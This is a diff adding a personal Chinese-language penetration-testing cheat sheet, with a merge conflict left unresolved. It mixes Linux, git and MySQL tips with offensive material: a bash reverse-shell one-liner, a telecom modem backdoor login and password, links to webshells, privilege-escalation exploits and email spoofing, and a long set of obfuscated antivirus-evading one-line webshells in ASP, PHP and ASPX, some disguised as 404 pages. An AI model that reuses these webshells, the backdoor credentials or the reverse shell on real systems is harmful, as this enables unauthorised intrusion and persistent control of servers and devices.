@@ -1,0 +1,186 @@
+1.没用过的在线扫描器：
+    https://jawfish.io/
+2.使用python开启一个简单的http服务：
+    python -m SimpleHTTPServer 80    
+3.serve U运行cmd:
+    quote site exec "***"    
+4.账号telecomadmin密码nE7jA%5m   电信猫后门    
+5.linux local_root提权  http://exploit.linuxnote.org/
+6.metasploit与postgresql数据库连接：msf>db_connect msf3:AtZDNVQF3NJEyNqU9u1ciHcqTsbcZzKR@127.0.0.1:5432/msf3
+7.http://tool.chacuo.net/mailanonymous   伪造邮件发送，一小时邮箱
+8.bash -i >& /dev/tcp/IP/PORT 0>&1    bash反弹
+9.sed -i '/Love/d' 1.txt   删除包含Love的行
+10.加了vpn就相当于vpn强制给通信链路加了个限制：所有数据只能通过vpn进出。（正常联网的功能只是给系统加了连接其他地址的各种道路，必须先保证可以联网，然后可以保证加了vpn后的效果会是这样>>
+    先通过一些数据链路连接到vpn，然后vpn作为代理再访问互联网。
+11.tar -T mulu.list -czf file.tar.gz   
+12.分割大文件再合并
+    split -b 20m RevolutionOS.rmvb RevOS_part_,
+    cat RevOS_part_* > RevolutionOS_RSB.rmvb,
+    md5sum RevolutionOS.rmvb(md5sum RevolutionOS_RSB.rmvb)
+13.一些数据库操作
+	给数据库添加一个用户
+    CREATE USER 'username'@'host' IDENTIFIED BY 'password';（可小写）
+    修改密码
+    SET PASSWORD FOR 'username'@'host' = PASSWORD('newpassword');
+    修改权限
+    GRANT privileges ON databasename.tablename TO 'username'@'host' WITH GRANT OPTION；（databasename.tablename可为*.*,privileges可为all,注意databasename和tablename中不要有'.'这个标点，否则databasename.tablename不知道在哪儿算作分开，eg.gv32_cms5.1.9是数据库名，则会出错）
+14.ip:%23.23.23.23    (bing)
+15.暴路径http://www.lxway.com/1191778.html  
+16.sublime text快捷键好东西：http://www.cnblogs.com/lanxuezaipiao/p/4151095.html
+	ctrl+D,ctrl+shift+k,ctrl+shift+<-/->,按住shift右键拖动鼠标多行编辑，set syntax:python,ctrl+enter,ctrl+shift+enter,ctrl+[/],ctrl+shift+v完整粘贴源代码格式，移动一行ctrl+shift+上/下
+17.nmap :
+	nmap -v -sP -PI -PT -Pn 192.168.0.0/24
+	nmap -v -sn -PE 192.168.0.0/24 快速扫描局域网存活主机
+18.head -n 1 /etc/issue   # 查看linux操作系统版本
+   网络
+   
+   # ifconfig               # 查看所有网络接口的属性
+   # iptables -L            # 查看防火墙设置
+   # route -n               # 查看路由表
+   # netstat -lntp          # 查看所有监听端口
+   # netstat -antp          # 查看所有已经建立的连接
+   # netstat -s             # 查看网络统计信息
+19.linux backup and restore:<sudo>
+	1>backup:
+      cd /
+	  tar cvpzf linuxbackup.tgz --exclude=/proc --exclude=/lost+found --exclude=/linuxbackup.tgz --exclude=/mnt --exclude=/sys / 
+    2>restore:
+	  cd /
+      tar xvpfz linuxbackup.tgz -C / 
+      mkdir proc  
+      mdkir lost+found  
+      mkdir mnt   
+      mkdir sys
+      reboot
+    3>http://blog.csdn.net/shendl/article/details/7384755
+    4>https://wiki.archlinux.org/index.php/Full_system_backup_with_rsync
+20.python中import和from xx import xx需要注意的事:
+	import语句中:import或者from xx import xx语句当中,形如a.b的
+	用法如from a.b import f(f是b.py中一个函数名或者一个常量，a是一个文件夹，只有文件夹才
+	可以带.后接具体文件名《如此处的b<省略.py后缀>》，在具体的函数调用而不是import语句中，文件可
+	以带.后接文件中的函数或常量《如sqlmap中，在sqlmap目录下运行python,可以import tamper.sapce2comment,然
+	后运行tamper.space2comment.tamper(" ajf  "),但是不可以直接运行sapce2comment.tamper(" ajf  "),这样会报错，
+	而且以上两种情况都需要在tamper文件夹下面放一个__init__.py文件，里面的内容可以
+	为空，如果在sqlmap目录下使用from tamper import *则需
+	要在__init__.py里面加上__all__=['','',''...],其中''里面
+	是tamper目录下所有模块的模块名,这样的话就可以通过from tamper import *来导入所有模块了，然后
+	就可以使用如greatest.tamper("and 1>2")等的语句了》)
+21.神器lfi自动探测panoptic：https://github.com/lightos/Panoptic
+   神器load_file自动探测sqlnuke：https://github.com/nuke99/sqlnuke.git
+22.webshell：
+	http://www.passwaf.com/
+	http://cduan.cc/ma/index.htm
+	php-b374k(PHP version > 4.3.3 and PHP 5):https://github.com/b374k
+		     (browser old version): https://code.google.com/p/b374k-shell/
+23.经典入侵思路:
+	http://www.2cto.com/Article/201201/115793.html(伪静态注入到获得webshell)
+24.cookie注入中转http://www.rising.com.cn/newsletter/news/2012-08-23/12195.html(目前认为只可asp,get)
+25.vpn搭建教程(2003server)http://www.xfisp.com/style/info/shownews.asp?id=3
+26.关于ipcam的UPnP或NAT的知识http://www.pernet.tv/thread-103-1-1.html
+27.google search api(good):http://www.catonmat.net/blog/python-library-for-google-search/ (not good now   xgoogle)
+   google translate api(good):http://www.catonmat.net/blog/python-library-for-google-translate/   (not good now   xgoogle)
+   (little good can search[inurl:index.php?option=],but not([site:*.edu inurl:inurl.php?option=])) https://pypi.python.org/pypi/Google-Search-API
+   (guan_fang)google search api:http://scriptsonscripts.blogspot.com/2015/02/python-google-search-api-requests.html    ajax->json->guan_fang(custom search api,100 results per day for free user)
+   (good_GoogleScraper,!-s (google,yahoo,bing..))google search api:http://incolumitas.com/2013/01/06/googlesearch-a-rapid-python-class-to-get-search-results/    or    https://github.com/NikolaiT/GoogleScraper/blob/master/README.md
+   two links may mean (guan_fang)custom search api
+   may helpful:https://google-api-client-libraries.appspot.com/documentation/customsearch/v1/python/latest/customsearch_v1.cse.html
+   may helpful:https://github.com/google/google-api-python-client/tree/master/samples/customsearch
+   may helpful:http://wescpy.blogspot.com/2014/09/simple-google-api-access-from-python.html   http://wescpy.blogspot.com/2014/11/authorized-google-api-access-from-python.html
+   具体详情见百度云盘笔记文件夹
+28.linux的git使用:
+	http://www.linuxidc.com/Linux/2014-02/96989.htm
+	完成密钥的设置后:
+	git init
+	git add .
+	git remote add origin url
+	git commit -a -m "xxx"<没有这一步会显示error>
+<<<<<<< HEAD
+	git push -u origin master
+29.linux fdisk->ext3->mount:http://cuchadanfan.blog.51cto.com/9940284/1671416
+30.Cknife  java环境菜刀  已放到/usr/share
+31.免杀一句话:http://blog.hacku.cn/post/260.html
+	         http://www.freebuf.com/articles/web/9396.html
+	         kali linux2.0:
+	         	webacoo
+	         	weevely
+   asp:
+   <%Y=request("shezhang")%><%execute(Y)%>
+    
+   <%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("shezhang"))%>
+    
+   <%eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0"&"-"&"2"&"-"&"5"&")"&")")%>（密码是-7）
+
+   php:
+   <?php$a=str_replace(x,"","axsxxsxexrxxt");$a($_POST["shezhang"]);?>
+    
+   <?php$lang=(string)key($_POST);$lang($_POST['shezhang']);?>
+    
+   test<?php$k="ass"."ert";$k(${"_PO"."ST"}['nihao']);?>
+    
+   <?php $a="a"."s"."s"."e"."r"."t"; $a($_POST["shezhang"]); ?>
+    
+   <?php         
+   @$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";         
+   @$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";         
+   @$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}         
+   [/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>  密码是 -7
+   <?php if(!$_POST['nihao']){header('HTTP/1.1 404 Not Found'); exit(); }else{ $s="p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e"; @$s("~[discuz]~e",$_POST['nihao'],"Access denied"); } ?>
+
+   
+   <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+   <html><head>
+   <title>404 Not Found</title>
+   </head><body>
+   <h1>Not Found</h1>
+   <p>The requested URL was not found on this server.</p>
+   </body></html>
+   <?php
+   ($b4dboy = $_POST['nihao']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add'); 
+   header('HTTP/1.1 404 Not Found');
+   ?>
+
+   aspx:
+   ASPX一句话的过安全狗效果不怎么样,不过我认为能支持aspx百分之8/90支持asp
+   <%@PageLanguage=Jscript%>      
+   <%var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"+"v"+/*-/*-*/
+   "a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"+"t"+      
+   "[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]"+      
+   ","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval      
+   (/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>  密码 -7
+    
+    
+   <%@PageLanguage="Jscript"%><%eval(Request.Item["shezhang"],"unsafe");%>
+    
+    
+   <scriptlanguage="C#"runat="server">      
+   WebAdmin2Y.x.yaaaaa=newWebAdmin2Y.x.y("add6bb58e139be10");      
+   </script>                              密码是webadmin
+31.windows local privileges:http://www.52wa.net/post-198.html
+32.phpstudy for linux:
+	wget -c http://lamp.phpstudy.net/phpstudy.bin?
+	chmod +x phpstudy.bin
+	#权限设置
+	./phpstudy.bin     #运行安装
+
+	服务进程管理：phpstudy (start|stop|restart|uninstall)
+	站点主机管理：phpstudy (add|del|list)
+	ftpd用户管理：phpstudy ftp (add|del|list)
+33.strem:http://www.yxbao.com/bd/27803.html#goDown
+34.linux的git使用:
+	http://www.linuxidc.com/Linux/2014-02/96989.htm
+	完成密钥的设置后:
+	git init
+	git add .
+	git remote add origin url
+	git commit -a -m "xxx"<没有这一步会显示error>
+	git push -u origin master
+35.生活学习：1>(本杰明-富兰克林13条)http://www.201980.com/lizhi/chenggong/9386.html
+			2>（曾国藩修身12条）http://www.201980.com/lizhi/chenggong/8007.html
+36.mouse without borders:多屏幕同键盘鼠标控制
+							https://www.microsoft.com/en-us/download/confirmation.aspx?id=35460（win）
+							http://alternativeto.net/software/mouse-without-borders2/?platform=linux(linux)
+							x2vnc(目前认为最好，通过vnc达到mouse without borders的功能！！)
+							
+=======
+	git push -u origin master
+>>>>>>> 9a679509e551f014f0d31a7af78f291cc15ec32e
